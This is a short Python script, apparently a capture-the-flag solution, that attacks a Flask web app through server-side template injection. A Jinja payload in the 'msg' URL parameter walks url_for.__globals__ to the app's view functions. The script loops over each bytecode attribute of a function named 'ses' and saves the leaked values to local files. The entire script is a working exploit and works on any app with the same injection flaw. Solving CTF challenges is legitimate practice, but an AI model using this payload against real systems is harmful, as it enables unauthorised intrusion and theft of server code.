import requests as req
import re

__CODE__ = [
    'co_argcount',
    'co_filename',
    'co_kwonlyargcount',
    'co_cellvars',
    'co_firstlineno',
    'co_lnotab',
    'co_code',
    'co_flags',
    'co_name',
    'co_consts',
    'co_freevars',
    'co_names',
    'co_nlocals',
    'co_stacksize',
    'co_varnames'
]
URL = "http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{%print url_for.__globals__['current_app'].view_functions.ses.__code__.{x} | safe %}}"


def save(name, data):
    with open("_t_%s" % name, 'wb') as f:
        f.write(data.encode('utf-8'))
if __name__ == '__main__':
    # res = req.get(URL.format(x='co_names'))
    # if res.status_code == 200:
    #     html = res.content.decode('utf-8')
    #     m = re.findall(r'<h2 class="form-signin-heading">(.*?)</h2>', html)
    #     # print(m[0])
    #     if m and len(m) > 0:
    #         save('co_names', m[0])
    for i in __CODE__:
        res = req.get(URL.format(x=i))
        if res.status_code == 200:
            html = res.content.decode('utf-8')
            m = re.findall(r'<h2 class="form-signin-heading">(.*?)</h2>', html)
            # print(m[0])
            if m and len(m) > 0:
                save(i, m[0])
